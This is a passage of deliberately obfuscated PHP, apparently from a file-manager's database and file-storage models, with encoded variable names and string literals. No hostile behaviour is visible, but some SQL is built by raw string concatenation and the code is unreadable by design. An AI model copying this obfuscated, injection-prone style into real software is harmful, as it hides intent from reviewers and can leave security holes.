¬©Å}\140\x20\x53\x45\124\40{$Ôïòº›ı[2]}\40\75\40\103\101\x53\105\40{$Ôïòº›ı[0]}\x20\12"; if ($ÕöÉ”¶ == 0) { $ó«ç…¯ò = $½Ë¹ã¼Ì; } $¥ øâĞ[] = $ÅŠĞÉá¯[118] . $Ôïòº›ı[1] . $ÅŠĞÉá¯[118]; $ÕöÉ”¶++; $ó«ç…¯ò .= "\x20\x57\110\105\x4e\40\47{$Ôïòº›ı[1]}\47\x20\x54\x48\105\116\x20\x27{$Ôïòº›ı[3]}\47\x20\12"; if ($ÕöÉ”¶ == $„ŠÄ£š¾ || $÷¾í¾… == $ğóÖ¯¢½ - 1) { $ÇÖ‹¾õ‡ = implode($ÅŠĞÉá¯[50], $¥ øâĞ); $ó«ç…¯ò .= "\40\105\116\104\x20\x20\127\x48\x45\122\x45\40{$Ôïòº›ı[0]}\x20\111\116\40\50{$ÇÖ‹¾õ‡}\51\x20"; $this->execute($ó«ç…¯ò); $ÕöÉ”¶ = 0; $ó«ç…¯ò = $½Ë¹ã¼Ì; $this->chunkEventCheck(count($¥ øâĞ)); $¥ øâĞ = array(); } } $this->chunkEventSet(); } public function saveAllEach($…´Èšñ) { $¶áèæª‰ =& $_SERVER[å¸¿•¶£]; $Æ÷ôÏœì = $this->tablePrefix . $this->tableName; foreach ($…´Èšñ as $ÁèÈğÍÇ) { if (!is_array($ÁèÈğÍÇ) || count($ÁèÈğÍÇ) != 4) { continue; } $µÇò“Ğ² = $ÁèÈğÍÇ[0] . $¶áèæª‰[379] . $ÁèÈğÍÇ[1] . $¶áèæª‰[118]; $é‘É™²• = $ÁèÈğÍÇ[2] . $¶áèæª‰[379] . $ÁèÈğÍÇ[3] . $¶áèæª‰[118]; $¸½Âı = "\165\160\144\141\164\x65\40{$Æ÷ôÏœì}\40\x73\145\x74\40{$é‘É™²•}\40\167\x68\145\162\145\40{$µÇò“Ğ²}\73"; $this->execute($¸½Âı); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÍôÉ¶Ùˆ = false, $ÒÀèå = false) { $this->_chunkEvent = $ÍôÉ¶Ùˆ; $this->_chunkEventParam = $ÒÀèå; } private function chunkEventCheck($İÔÂâ¨) { if (!$this->_chunkEvent) { return; } $¹¨¬üËÒ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¹¨¬üËÒ[$_SERVER[å¸¿•¶£][380]] = $İÔÂâ¨; Hook::trigger($this->_chunkEvent, $¹¨¬üËÒ); } public function addAll($çæ€»ú», $Ò–»œ´ë = array(), $¥åøã¸¶ = false) { $ÙË·®Ë =& $_SERVER[å¸¿•¶£]; ignore_timeout(); $ë“»äÅ = self::SQL_WHERE_IN_CHUNK; if (empty($çæ€»ú»)) { $this->error = think_lang($ÙË·®Ë[271]); return !1; } $Ò–»œ´ë = $this->_parseOptions($Ò–»œ´ë); foreach ($çæ€»ú» as $¬§à»œ => $ÛÇõÃ«Ú) { $çæ€»ú»[$¬§à»œ] = $this->_facade($ÛÇõÃ«Ú); $this->_beforeInsert($çæ€»ú»[$¬§à»œ], $Ò–»œ´ë); } if (method_exists($this->db, $ÙË·®Ë[272])) { for ($ÜÇùñ¶ = 0; $ÜÇùñ¶ < count($çæ€»ú»); $ÜÇùñ¶ += $ë“»äÅ) { $¾Äõ¥çŞ = array_slice($çæ€»ú», $ÜÇùñ¶, $ë“»äÅ); if (!is_array($¾Äõ¥çŞ) || count($¾Äõ¥çŞ) == 0) { break; } $îê»æÄ£ = $this->db->insertAll($¾Äõ¥çŞ, $Ò–»œ´ë, $¥åøã¸¶); $this->chunkEventCheck(count($¾Äõ¥çŞ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($çæ€»ú» as $¬§à»œ => $ÛÇõÃ«Ú) { $îê»æÄ£ = $this->db->insert($ÛÇõÃ«Ú, $Ò–»œ´ë, $¥åøã¸¶); } $this->commit(); } if (!1 !== $îê»æÄ£) { $„Èíó¿» = $this->getLastInsID(); if ($„Èíó¿») { return $„Èíó¿»; } } return $îê»æÄ£; } public function save($Ô…Ú¼ñ = '', $úÄ¨Ì÷× = array()) { $´°‘È³ =& $_SERVER[å¸¿•¶£]; $´èŒœ¦ = self::SQL_WHERE_IN_CHUNK; $¬ÊÅÕŠ = $this->optionsValue(); $ù†ı™ıç = $this->findWhereField($¬ÊÅÕŠ); if (!$ù†ı™ıç) { return parent::save($Ô…Ú¼ñ, $úÄ¨Ì÷×); } $ÂúµÇºˆ = 0; $µğÀŸë› = $¬ÊÅÕŠ[$´°‘È³[275]][$ù†ı™ıç][1]; $µğÀŸë› = is_array($µğÀŸë›) ? $µğÀŸë› : array(); $ÚôªÄ’ğ = count($µğÀŸë›); for ($µ±Ã«Ÿ» = 0; $µ±Ã«Ÿ» < $ÚôªÄ’ğ; $µ±Ã«Ÿ» += $´èŒœ¦) { $Ìº€Ö¨î = array_slice($µğÀŸë›, $µ±Ã«Ÿ», $´èŒœ¦); if (!is_array($Ìº€Ö¨î) || count($Ìº€Ö¨î) == 0) { break; } $¬ÊÅÕŠ[$´°‘È³[275]][$ù†ı™ıç][1] = $Ìº€Ö¨î; $this->optionsValue($¬ÊÅÕŠ); $ÂúµÇºˆ += parent::save($Ô…Ú¼ñ, $úÄ¨Ì÷×); $this->chunkEventCheck(count($Ìº€Ö¨î)); } $this->chunkEventSet(); return $ÂúµÇºˆ; } public function add($»æÜÛ»º = '', $ööÉ¨Æ = array(), $àõü˜ÑŠ = false) { if ($this->addTaskStatus && is_array($»æÜÛ»º)) { $this->addTaskData[] = $»æÜÛ»º; return; } return parent::add($»æÜÛ»º, $ööÉ¨Æ, $àõü˜ÑŠ); } public function parseWhereLike($èÈª©, $éŸ”¶Û = '', $É–°Ò–à = false, &$²ıØ¨êÎ = false) { $Ôèñ­“” =& $_SERVER[å¸¿•¶£]; $„İ¥×ºÔ = $GLOBALS[$Ôèñ­“”[6]][$Ôèñ­“”[381]]; if (!$„İ¥×ºÔ[$Ôèñ­“”[382]]) { return $èÈª©; } if (!is_array($èÈª©)) { return $èÈª©; } $í÷Çİô = array(); $î£Óî¦Ù = 0; foreach ($èÈª© as $Ğ¶–¯› => $ñóÁä×ñ) { if (is_array($ñóÁä×ñ) && count($ñóÁä×ñ) == 2 && $ñóÁä×ñ[0] == $Ôèñ­“”[383] && is_string($ñóÁä×ñ[1]) && substr($ñóÁä×ñ[1], 0, 1) == $Ôèñ­“”[384] && substr($ñóÁä×ñ[1], strlen($ñóÁä×ñ[1]) - 1, 1) == $Ôèñ­“”[384]) { $²ıØ¨êÎ = !0; $ÕÌ—Ş½ = is_string($Ğ¶–¯›) ? $Ğ¶–¯› : $éŸ”¶Û; $íÎıùÑ = substr($ñóÁä×ñ[1], 1, strlen($ñóÁä×ñ[1]) - 2); $íÎıùÑ = $this->db->escapeString($íÎıùÑ); if (!strpos($ÕÌ—Ş½, $Ôèñ­“”[10])) { $ÕÌ—Ş½ = $Ôèñ­“”[385] . $ÕÌ—Ş½ . $Ôèñ­“”[385]; } $²åÊûş = $Ôèñ­“”[189] . $íÎıùÑ . $Ôèñ­“”[189]; $íÎıùÑ = str_replace(array($Ôèñ­“”[10], $Ôèñ­“”[386], $Ôèñ­“”[11]), $Ôèñ­“”[387], $íÎıùÑ); if ($„İ¥×ºÔ[$Ôèñ­“”[388]]) { $²åÊûş = $Ôèñ­“”[389] . $íÎıùÑ . $Ôèñ­“”[390]; if ($„İ¥×ºÔ[$Ôèñ­“”[391]]) { $²åÊûş = $Ôèñ­“”[390] . $íÎıùÑ . $Ôèñ­“”[389]; } } $í÷Çİô[$î£Óî¦Ù] = $Ôèñ­“”[392] . $ÕÌ—Ş½ . $Ôèñ­“”[393] . $²åÊûş . $Ôèñ­“”[394]; $î£Óî¦Ù++; continue; } if (is_array($ñóÁä×ñ)) { $éŸ”¶Û = is_string($Ğ¶–¯›) ? $Ğ¶–¯› : $éŸ”¶Û; $ñóÁä×ñ = $this->parseWhereLike($ñóÁä×ñ, $éŸ”¶Û, !0, $²ıØ¨êÎ); } if (is_numeric($Ğ¶–¯›)) { $í÷Çİô[$î£Óî¦Ù] = $ñóÁä×ñ; $î£Óî¦Ù++; } else { $í÷Çİô[$Ğ¶–¯›] = $ñóÁä×ñ; } } if ($²ıØ¨êÎ && !$É–°Ò–à) { } return $í÷Çİô; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Œ²¯ÅŞ = array()) { $óï²ÜãÄ =& $_SERVER[å¸¿•¶£]; $°´áºÕ = self::SQL_WHERE_IN_CHUNK; $ÁõıÉİ­ = $this->optionsValue(); $åµ²°’ì = $this->findWhereField($ÁõıÉİ­); if (!$åµ²°’ì || isset($ÁõıÉİ­[$óï²ÜãÄ[292]]) || isset($ÁõıÉİ­[$óï²ÜãÄ[353]])) { return parent::select($Œ²¯ÅŞ); } $É¾ÒÈäÁ = $ÁõıÉİ­[$óï²ÜãÄ[275]][$åµ²°’ì][1]; $É¾ÒÈäÁ = is_array($É¾ÒÈäÁ) ? $É¾ÒÈäÁ : array(); $ˆˆÄ°Š = null; for ($”¸«®Æ = 0; $”¸«®Æ < count($É¾ÒÈäÁ); $”¸«®Æ += $°´áºÕ) { $İÖñ‚µ = array_slice($É¾ÒÈäÁ, $”¸«®Æ, $°´áºÕ); if (!is_array($İÖñ‚µ) || count($İÖñ‚µ) == 0) { break; } $ÁõıÉİ­[$óï²ÜãÄ[275]][$åµ²°’ì][1] = $İÖñ‚µ; $this->optionsValue($ÁõıÉİ­); $ÖÉØÈ×û = parent::select($Œ²¯ÅŞ); if (!$ÖÉØÈ×û) { continue; } $ˆˆÄ°Š = is_array($ˆˆÄ°Š) ? $ˆˆÄ°Š : array(); $ˆˆÄ°Š = array_merge($ˆˆÄ°Š, $ÖÉØÈ×û); } return $ˆˆÄ°Š; } public function delete($Ç¸êğµ¤ = array()) { $íŒŒ¿„º =& $_SERVER[å¸¿•¶£]; $…§ÒöÓÚ = self::SQL_WHERE_IN_CHUNK; $Âö¦Àî = $this->optionsValue(); $­”ı¿Û÷ = $this->findWhereField($Âö¦Àî); if (!$­”ı¿Û÷) { return parent::delete($Ç¸êğµ¤); } $ ÈöÓ‡ = 0; $óœ§ş = $Âö¦Àî[$íŒŒ¿„º[275]][$­”ı¿Û÷][1]; $óœ§ş = is_array($óœ§ş) ? $óœ§ş : array(); for ($„íÔ¤¿ä = 0; $„íÔ¤¿ä < count($óœ§ş); $„íÔ¤¿ä += $…§ÒöÓÚ) { $šöÏôµù = array_slice($óœ§ş, $„íÔ¤¿ä, $…§ÒöÓÚ); if (!is_array($šöÏôµù) || count($šöÏôµù) == 0) { break; } $Âö¦Àî[$íŒŒ¿„º[275]][$­”ı¿Û÷][1] = $šöÏôµù; $this->optionsValue($Âö¦Àî); $ ÈöÓ‡ += parent::delete($Ç¸êğµ¤); } return $ ÈöÓ‡; } private function findWhereField($¦¶òÉñœ) { $µ×ç›¾– =& $_SERVER[å¸¿•¶£]; $ë„úøß = self::SQL_WHERE_IN_CHUNK; if (!is_array($¦¶òÉñœ) || !is_array($¦¶òÉñœ[$µ×ç›¾–[275]])) { return !1; } foreach ($¦¶òÉñœ[$µ×ç›¾–[275]] as $ïÍÍ½»Š => $‰ÈñŸ›ñ) { if (is_array($‰ÈñŸ›ñ) && isset($‰ÈñŸ›ñ[0]) && is_string($‰ÈñŸ›ñ[0]) && strtolower($‰ÈñŸ›ñ[0]) == $µ×ç›¾–[7] && is_array($‰ÈñŸ›ñ[1]) && count($‰ÈñŸ›ñ[1]) > $ë„úøß) { ignore_timeout(); return $ïÍÍ½»Š; } } return !1; } public function setMasterDB($Ú¢¦æÇ° = true) { think_config($_SERVER[å¸¿•¶£][395], $Ú¢¦æÇ°); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\155\117\160\164\x69\157\x6e"; public $field = array(); public function listData($÷™ºÑÑÊ = false, $¹›Ë« = "\x6d\157\x64\x69\146\171\124\151\x6d\145", $ÃÆæúÀ› = false) { $öŒÏô– = Model($this->modelType)->get(!1, $this->optionType, !0); $»¿Ã·Â = array_values($öŒÏô–); if ($»¿Ã·Â && $»¿Ã·Â[0] && !is_array($»¿Ã·Â[0])) { Model($this->modelType)->cacheRemove($this->optionType); $öŒÏô– = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$öŒÏô–) { return $÷™ºÑÑÊ ? null : array(); } if (!$÷™ºÑÑÊ) { $öŒÏô– = array_filter(array_values($öŒÏô–)); return array_sort_by($öŒÏô–, $¹›Ë«, $ÃÆæúÀ›); } return $öŒÏô–[$_SERVER[å¸¿•¶£][396] . $÷™ºÑÑÊ]; } public function insert($¨ç¶´®‘) { $Êá†ô¯ =& $_SERVER[å¸¿•¶£]; $¨ç¶´®‘ = array_field_key($¨ç¶´®‘, $this->field); $›‰Üñƒ = Model($this->modelType)->get($Êá†ô¯[397], $this->optionType . $Êá†ô¯[398]); $›‰Üñƒ = $›‰Üñƒ ? $›‰Üñƒ : 0; $¨ç¶´®‘[$Êá†ô¯[399]] = ++$›‰Üñƒ; $¨ç¶´®‘[$Êá†ô¯[201]] = time(); $¨ç¶´®‘[$Êá†ô¯[85]] = time(); Model($this->modelType)->set($Êá†ô¯[397], $›‰Üñƒ, $this->optionType . $Êá†ô¯[398]); Model($this->modelType)->set($Êá†ô¯[396] . $›‰Üñƒ, $¨ç¶´®‘, $this->optionType); return $›‰Üñƒ; } public function update($²âÇ¸, $ÔÕ˜Ù×Õ) { $•ûİÍÎÂ =& $_SERVER[å¸¿•¶£]; $ÔÕ˜Ù×Õ = array_field_key($ÔÕ˜Ù×Õ, $this->field); $œƒÊøÏ— = $this->listData($²âÇ¸); if (!$œƒÊøÏ— || !$²âÇ¸) { return !1; } $ÔÕ˜Ù×Õ = array_merge($œƒÊøÏ—, $ÔÕ˜Ù×Õ); $ÔÕ˜Ù×Õ[$•ûİÍÎÂ[85]] = time(); return Model($this->modelType)->set($•ûİÍÎÂ[396] . $²âÇ¸, $ÔÕ˜Ù×Õ, $this->optionType); } public function remove($ÜæÅÒÊ·) { if (!$ÜæÅÒÊ·) { return !1; } return Model($this->modelType)->remove($_SERVER[å¸¿•¶£][396] . $ÜæÅÒÊ·, $this->optionType); } public function clear() { $ª£¦ƒå· =& $_SERVER[å¸¿•¶£]; Model($this->modelType)->remove($ª£¦ƒå·[397], $this->optionType . $ª£¦ƒå·[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($£šŸ¹ÓÀ, $î¾Õòëé) { if (!$î¾Õòëé) { return !1; } $ïšÏ‰¦‹ = $this->listData(); $ïšÏ‰¦‹ = array_to_keyvalue($ïšÏ‰¦‹, $£šŸ¹ÓÀ); return isset($ïšÏ‰¦‹[$î¾Õòëé]) ? $ïšÏ‰¦‹[$î¾Õòëé] : !1; } public function findByName($Œ°ä–ùÈ) { return $this->findByKey($_SERVER[å¸¿•¶£][32], $Œ°ä–ùÈ); } protected function resetData($ŸÑ°É·) { $§ä—ø =& $_SERVER[å¸¿•¶£]; $ŸÑ°É· = is_array($ŸÑ°É·) ? $ŸÑ°É· : array(); $”üı‰çî = array(); for ($õœ“Ä“ª = 0; $õœ“Ä“ª < count($ŸÑ°É·); $õœ“Ä“ª++) { $”üı‰çî[$§ä—ø[396] . $ŸÑ°É·[$õœ“Ä“ª][$§ä—ø[399]]] = $ŸÑ°É·[$õœ“Ä“ª]; } return Model($this->modelType)->set($”üı‰çî, !1, $this->optionType); } private function getAutoName($¡ìëÅ‚) { $‰ã¹è“« = array_to_keyvalue($this->listData(), $_SERVER[å¸¿•¶£][32]); if (!$‰ã¹è“« || !isset($‰ã¹è“«[$¡ìëÅ‚])) { return $¡ìëÅ‚; } for ($åùÒ´ßå = 1; $åùÒ´ßå < count($‰ã¹è“«); $åùÒ´ßå++) { $¢ş…ƒ¡ö = $¡ìëÅ‚ . "\x28{$åùÒ´ßå}\51"; if (!isset($‰ã¹è“«[$¢ş…ƒ¡ö])) { return $¢ş…ƒ¡ö; } } return $¢ş…ƒ¡ö; } } goto a”ÃÖ¬Œ¹; Dë¸òªµ‰”: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\145\137\143\157\156\x74\145\156\x74\x73"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\x54\x69\x6d\145", "\164\x69\x6d\145", "\151\156\163\145\162\x74", "\146\165\x6e\x63\x74\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\145"; protected $tableMeta = array("\x74\141\142\x6c\145\116\141\155\x65" => "\151\x6f\137\x66\x69\x6c\145\137\155\145\x74\141", "\155\145\x74\x61\106\x69\x65\154\144" => "\x66\151\154\145\111\x44"); public function fileInfo($£áäÔó) { $ÑÑ¿¥Öç =& $_SERVER[å¸¿•¶£]; static $º–öô¼– = array(); if (!isset($º–öô¼–[$£áäÔó])) { $‹ ú…Í‚ = $ÑÑ¿¥Öç[1912]; $ª©§Ş¥€ = Model($ÑÑ¿¥Öç[471])->field($‹ ú…Í‚)->where(array($ÑÑ¿¥Öç[469] => $£áäÔó))->find(); $º–öô¼–[$£áäÔó] = $ª©§Ş¥€; } return $º–öô¼–[$£áäÔó]; } public function addFileByContent($’‹º¶æ” = '', $§“ñ’Š¼ = '') { $ı¾ÊŸÏ =& $_SERVER[å¸¿•¶£]; $¡²à‹ãİ = TEMP_PATH . $ı¾ÊŸÏ[1913]; if (!is_dir($¡²à‹ãİ)) { mk_dir($¡²à‹ãİ); } $©±ìîÀ = $¡²à‹ãİ . $ı¾ÊŸÏ[1914] . rand_string(16); file_put_contents($©±ìîÀ, $’‹º¶æ”); $Ê²Äò† = $this->addFile($©±ìîÀ, $§“ñ’Š¼, !0); if (file_exists($©±ìîÀ)) { @unlink($©±ìîÀ); } return $Ê²Äò†; } public function createFileName($ï•½³ ¡, $ãßÊ— = false, $´““Ø¿ = false) { $”«ã” =& $_SERVER[å¸¿•¶£]; $¸¬ÃéÃö = IO::init($”«ã”[8]); $ìÛ¤ë­Ó = $this->makeFilePath($ï•½³ ¡, $¸¬ÃéÃö, $ãßÊ—, $´““Ø¿); $š„‡š™Ó = $¸¬ÃéÃö->pathFather($ìÛ¤ë­Ó); static $©Áƒõò = false; $×ä¡ì‚Œ = $”«ã”[1915] . md5($š„‡š™Ó); if (!$©Áƒõò && !Cache::get($×ä¡ì‚Œ)) { $©Áƒõò = !0; $¿“Î¤ÖÖ = IO::mkdir($š„‡š™Ó); if (!IO::exist($¿“Î¤ÖÖ . $”«ã”[804])) { IO::mkfile($¿“Î¤ÖÖ . $”«ã”[804]); } Cache::set($×ä¡ì‚Œ, 1, 3600 * 2); } return $ìÛ¤ë­Ó; } public function makeFilePath($À æé‹‹, $Ïˆ ô©, $ïèÔàÈ = false, $¸ğúª»Í = false) { $µ¥ÕÙÖ‡ =& $_SERVER[å¸¿•¶£]; $äû—á‡´ = Model($µ¥ÕÙÖ‡[777])->get($µ¥ÕÙÖ‡[1916]); $æ†´¡¬ï = KodIO::defaultIO() . date($µ¥ÕÙÖ‡[1917]); $ŒãÕÁÂş = $æ†´¡¬ï . rand_string(5) . short_id(100); $À æé‹‹ = str_replace($µ¥ÕÙÖ‡[8], $µ¥ÕÙÖ‡[11], KodIO::clear($À æé‹‹)); $Ñ†şÜ„ı = $Ïˆ ô©->ext($À æé‹‹); if (!$À æé‹‹) { $äû—á‡´ = $µ¥ÕÙÖ‡[1918]; } switch ($äû—á‡´) { case $µ¥ÕÙÖ‡[1919]: $ŒãÕÁÂş = $ŒãÕÁÂş . $µ¥ÕÙÖ‡[10] . $Ïˆ ô©->ext($À æé‹‹); if ($Ñ†şÜ„ı == $µ¥ÕÙÖ‡[1856]) { $ŒãÕÁÂş .= $µ¥ÕÙÖ‡[1213]; } break; case $µ¥ÕÙÖ‡[1920]: $•Òµğş¾ = Model($µ¥ÕÙÖ‡[777])->get($µ¥ÕÙÖ‡[778]); $ÄåÈ‘Ë = substr(md5($µ¥ÕÙÖ‡[779] . $•Òµğş¾ . date($µ¥ÕÙÖ‡[754])), 0, 8); $½´ì¸û™ = KodIO::defaultDriver(); $æ†´¡¬ï = $µ¥ÕÙÖ‡[1244] . $½´ì¸û™[$µ¥ÕÙÖ‡[399]] . $µ¥ÕÙÖ‡[409] . date($µ¥ÕÙÖ‡[1921]) . $ÄåÈ‘Ë . $µ¥ÕÙÖ‡[8]; if ($Ñ†şÜ„ı == $µ¥ÕÙÖ‡[1856]) { $À æé‹‹ .= $µ¥ÕÙÖ‡[1213]; } $ï¿´©­™ = $µ¥ÕÙÖ‡[1922] . $æ†´¡¬ï . $À æé‹‹; CacheLock::lock($ï¿´©­™); $ŒãÕÁÂş = $æ†´¡¬ï . $À æé‹‹; if (IO::exist($æ†´¡¬ï . $À æé‹‹)) { $“¿÷Ãëæ = substr($À æé‹‹, 0, strlen($À æé‹‹) - strlen($Ñ†şÜ„ı)); $¾ÑûÎğø = $¸ğúª»Í ? substr($¸ğúª»Í, 0, 5) : ($ïèÔàÈ ? substr($ïèÔàÈ, 0, 5) : rand_string(5)); $ŒãÕÁÂş = $æ†´¡¬ï . $“¿÷Ãëæ . $¾ÑûÎğø . $µ¥ÕÙÖ‡[10] . $Ñ†şÜ„ı; } if (IO::isTypeObject($ŒãÕÁÂş) && !IO::isUploadServer($ŒãÕÁÂş)) { if (IO::exist($ŒãÕÁÂş)) { return $ŒãÕÁÂş; } $¬¬é›¾± = IO::setContent($ŒãÕÁÂş, $µ¥ÕÙÖ‡[12]); if (!$¬¬é›¾±) { show_json($µ¥ÕÙÖ‡[1923], !1); } } CacheLock::unlock($ï¿´©­™); break; case $µ¥ÕÙÖ‡[1918]: break; default: break; } return $ŒãÕÁÂş; } public function addFileByRemote($­àÆı£¥, $ÛäïîÏ, $Ñßõ›… = array()) { $„Ñ•õİ° =& $_SERVER[å¸¿•¶£]; if (!IO::exist($­àÆı£¥)) { return !1; } $¸ê¼ÀÈ¾ = $Ñßõ›…[$„Ñ•õİ°[176]] ? $Ñßõ›…[$„Ñ•õİ°[176]] : $„Ñ•õİ°[12]; $şÁë¥Øï = IO::hashMd5($­àÆı£¥, $¸ê¼ÀÈ¾); $øÎÙ³‡ = KodIO::defaultDriver(); $Å‘Öã÷‘ = array($„Ñ•õİ°[545] => IO::size($­àÆı£¥), $„Ñ•õİ°[1924] => 1, $„Ñ•õİ°[420] => $ÛäïîÏ, $„Ñ•õİ°[815] => $øÎÙ³‡[$„Ñ•õİ°[399]], $„Ñ•õİ°[421] => $­àÆı£¥, $„Ñ•õİ°[1925] => $Ñßõ›…[$„Ñ•õİ°[177]] ? $Ñßõ›…[$„Ñ•õİ°[177]] : IO::hashSimple($­àÆı£¥), $„Ñ•õİ°[1926] => $şÁë¥Øï ? $şÁë¥Øï : $¸ê¼ÀÈ¾); if ($çÙĞµÒÒ = $this->addFileCheckExist($Å‘Öã÷‘[$„Ñ•õİ°[177]], $Å‘Öã÷‘[$„Ñ•õİ°[176]], $Å‘Öã÷‘[$„Ñ•õİ°[76]])) { return $çÙĞµÒÒ; } return $this->addFileData($Å‘Öã÷‘); } private function addFileData($²àßÏıí) { $¯Ù¤Ó¥Ğ =& $_SERVER[å¸¿•¶£]; if (!$²àßÏıí) { return !1; } $²àßÏıí[$¯Ù¤Ó¥Ğ[76]] = intval($²àßÏıí[$¯Ù¤Ó¥Ğ[76]]); if (!$²àßÏıí[$¯Ù¤Ó¥Ğ[76]] && strlen($²àßÏıí[$¯Ù¤Ó¥Ğ[177]]) > 32) { $²àßÏıí[$¯Ù¤Ó¥Ğ[76]] = intval(substr($²àßÏıí[$¯Ù¤Ó¥Ğ[177]], 32)); } $æ€Ó×’Ã = $this->add($²àßÏıí); return $this->find($æ€Ó×’Ã); } public function addFile($¸‘ò¿¨¸, $Õ¨­ÛĞ, $¹‡†µûı = false) { $äìà¼ü‰ =& $_SERVER[å¸¿•¶£]; $½·–Îé„ = IO::hashSimple($¸‘ò¿¨¸); $Î¾ÌÈíÇ = IO::size($¸‘ò¿¨¸); $çà´ªÊ = $Î¾ÌÈíÇ <= 1024 * 1024 * 10 ? IO::hashMd5($¸‘ò¿¨¸) : $äìà¼ü‰[12]; $¨ë÷Ş§± = $äìà¼ü‰[1927] . $½·–Îé„; CacheLock::lock($¨ë÷Ş§±); if ($çà´ªÊ && $½·–Îé„) { $¯¯Ú¶šŸ = $this->addFileCheckExist($½·–Îé„, $çà´ªÊ, $Î¾ÌÈíÇ); if ($¯¯Ú¶šŸ) { CacheLock::unlock($¨ë÷Ş§±); return $¯¯Ú¶šŸ; } } $ùºïä¨ = $this->addFileMake($¸‘ò¿¨¸, $Î¾ÌÈíÇ, $½·–Îé„, $çà´ªÊ, $Õ¨­ÛĞ, $¹‡†µûı); $¸ú®Ôô = $this->addFileData($ùºïä¨); CacheLock::unlock($¨ë÷Ş§±); if (!$çà´ªÊ && $¸ú®Ôô) { $this->fileMd5Check($¸ú®Ôô); } return $¸ú®Ôô; } private function fileMd5Check($ÄÜˆ§•à) { $ŒÔê¯¢– =& $_SERVER[å¸¿•¶£]; $¦‘´©ˆÏ = array($ÄÜˆ§•à[$ŒÔê¯¢–[468]], $ÄÜˆ§•à[$ŒÔê¯¢–[84]]); $üØí•­ˆ = $ŒÔê¯¢–[1928] . $ÄÜˆ§•à[$ŒÔê¯¢–[84]]; $‡¼Êıìâ = $ŒÔê¯¢–[1929] . $ÄÜˆ§•à[$ŒÔê¯¢–[468]]; $ ¯òö‹ö = TaskQueue::add($ŒÔê¯¢–[1930], $¦‘´©ˆÏ, $üØí•­ˆ, $‡¼Êıìâ); if (!$ ¯òö‹ö) { $this->fileMd5Set($ÄÜˆ§•à[$ŒÔê¯¢–[468]], $ÄÜˆ§•à[$ŒÔê¯¢–[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ˆÜßğ, $Øğ‰½Üã) { $¼×Ôåù =& $_SERVER[å¸¿•¶£]; $¨£—Ôå” = $this->find($ˆÜßğ); if (!$¨£—Ôå” || $¨£—Ôå”[$¼×Ôåù[176]]) { return; } $†Ù‹¢‰Ç = IO::hashMd5($Øğ‰½Üã); if (!$†Ù‹¢‰Ç) { return $¼×Ôåù[12]; } $this->where(array($¼×Ôåù[468] => $ˆÜßğ))->save(array($¼×Ôåù[176] => $†Ù‹¢‰Ç)); } public function addFileMake($¹íğùäç, $Ò£÷¤ş‹, $€æ‹£ã, $Ğ„öÅğ€, $÷ü”­é£, $ğ…Ö‚Šß) { $ÌÂ¯ =& $_SERVER[å¸¿•¶£]; $­¿ê‘¬Ì = $this->createFileName($÷ü”­é£, $€æ‹£ã, $Ğ„öÅğ€); $Åã¦€ª– = get_path_father($­¿ê‘¬Ì); $±àŠÖ˜¿ = get_path_this($­¿ê‘¬Ì); if ($ğ…Ö‚Šß) { $™ï½Ë§ = IO::move($¹íğùäç, $Åã¦€ª–, !1, $±àŠÖ˜¿); } else { $™ï½Ë§ = IO::copy($¹íğùäç, $Åã¦€ª–, !1, $±àŠÖ˜¿); } if (!$™ï½Ë§) { return !1; } $õ¬Ò¸§Ø = KodIO::defaultDriver(); $…æœäÖğ = array($ÌÂ¯[545] => $Ò£÷¤ş‹, $ÌÂ¯[1924] => 1, $ÌÂ¯[420] => $÷ü”­é£, $ÌÂ¯[815] => $õ¬Ò¸§Ø[$ÌÂ¯[399]], $ÌÂ¯[421] => $­¿ê‘¬Ì, $ÌÂ¯[1925] => $€æ‹£ã, $ÌÂ¯[1926] => $Ğ„öÅğ€); return $…æœäÖğ; } public function addFileCheckExist($Òüæ»Ç˜, $°Ù¤¿ü, $¸¸½Ó…) { $¥ô¿ä¿’ =& $_SERVER[å¸¿•¶£]; $â‹‚ªå¿ = $this->findByHash($Òüæ»Ç˜, $°Ù¤¿ü); if (!$â‹‚ªå¿) { return !1; } $ÒŞ´¥¦É = array($¥ô¿ä¿’[1924] => intval($â‹‚ªå¿[$¥ô¿ä¿’[1931]]) + 1, $¥ô¿ä¿’[545] => $¸¸½Ó…); $this->where(array($¥ô¿ä¿’[469] => $â‹‚ªå¿[$¥ô¿ä¿’[468]]))->save($ÒŞ´¥¦É); return $â‹‚ªå¿; } public function remove($İš°‹Ÿõ) { $this->linkCountChange($İš°‹Ÿõ, !1); $this->clearEmpty(); return !0; } public function linkAdd($‰¦İÒ·) { $this->linkCountChange($‰¦İÒ·, !0); } public function linkCountChange($÷‡Æ›‰Ğ, $äÅ×³ê) { $ì”À¦¶Ã =& $_SERVER[å¸¿•¶£]; if (!$÷‡Æ›‰Ğ) { return; } if (!is_array($÷‡Æ›‰Ğ)) { $÷‡Æ›‰Ğ = array($÷‡Æ›‰Ğ); } $ãà¦Şœû = array(); foreach ($÷‡Æ›‰Ğ as $÷˜çÖ§ƒ) { $—’Ê’…Ë = $÷˜çÖ§ƒ . $ì”À¦¶Ã[12]; if (!$ãà¦Şœû[$—’Ê’…Ë]) { $ãà¦Şœû[$—’Ê’…Ë] = 0; } $ãà¦Şœû[$—’Ê’…Ë]++; } $š´©Æïİ = array(); foreach ($ãà¦Şœû as $÷˜çÖ§ƒ => $ßí‡„‰) { $—’Ê’…Ë = $ßí‡„‰ . $ì”À¦¶Ã[12]; if (!$š´©Æïİ[$—’Ê’…Ë]) { $š´©Æïİ[$—’Ê’…Ë] = array(); } $š´©Æïİ[$—’Ê’…Ë][] = $÷˜çÖ§ƒ; 